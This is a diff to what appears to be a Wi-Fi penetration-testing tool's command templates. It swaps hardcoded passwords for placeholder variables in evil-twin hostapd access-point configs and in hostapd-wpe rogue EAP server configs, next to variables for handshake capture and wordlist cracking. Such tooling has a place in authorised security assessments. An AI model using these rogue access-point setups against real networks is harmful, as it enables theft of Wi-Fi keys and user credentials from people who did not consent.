@@ -7,6 +7,8 @@ order = 12
 #   iface=wlan0  mon_iface=wlan0mon  bssid=AA:BB:CC:DD:EE:FF  station=CLIENT_MAC
 #   channel=6  ssid=TargetNet  capture=captures/target  wordlist=/usr/share/wordlists/rockyou.txt
 #   hcap=handshake.hc22000  cap=handshake.cap  sae_hash=sae.22000
+#   password=…  — target/captured PSK (cred profile or :variable); not spray_password
+#   evil_twin_psk=WrongPassword123  eap_tls_key_pass=whatever
 #   eap=PEAP  phase2=mschapv2  cert_dir=/tmp/certs
 
 # === Host / interface enumeration ===
@@ -586,7 +588,7 @@ wpa=2
 wpa_key_mgmt=WPA-PSK
 wpa_pairwise=CCMP
 rsn_pairwise=CCMP
-wpa_passphrase=WrongPassword123
+wpa_passphrase={evil_twin_psk}
 EOF
 sudo hostapd /tmp/hostapd-wpa2.conf"""
 requires = ["hostapd"]
@@ -689,7 +691,7 @@ wpa_key_mgmt=WPA-PSK
 wpa_pairwise=CCMP
 rsn_pairwise=CCMP
 ieee80211w=0
-wpa_passphrase=WrongPassword123
+wpa_passphrase={evil_twin_psk}
 EOF
 sudo hostapd /tmp/hostapd-transition.conf"""
 requires = ["hostapd"]
@@ -937,7 +939,7 @@ eap_user_file=/etc/hostapd-wpe/hostapd-wpe.eap_user
 ca_cert=/etc/hostapd-wpe/certs/ca.pem
 server_cert=/etc/hostapd-wpe/certs/server.pem
 private_key=/etc/hostapd-wpe/certs/server.pem
-private_key_passwd=whatever
+private_key_passwd={eap_tls_key_pass}
 dh_file=/etc/hostapd-wpe/certs/dh
 EOF
 echo 'Edit paths above, then: sudo hostapd-wpe /tmp/hostapd-wpe.conf'"""
@@ -964,7 +966,7 @@ eap_user_file=/etc/hostapd-wpe/hostapd-wpe.eap_user
 ca_cert=/etc/hostapd-wpe/certs/ca.pem
 server_cert=/etc/hostapd-wpe/certs/server.pem
 private_key=/etc/hostapd-wpe/certs/server.pem
-private_key_passwd=whatever
+private_key_passwd={eap_tls_key_pass}
 dh_file=/etc/hostapd-wpe/certs/dh
 EOF
 echo 'Edit paths above, then: sudo hostapd-wpe /tmp/hostapd-wpe-wpa3.conf'"""
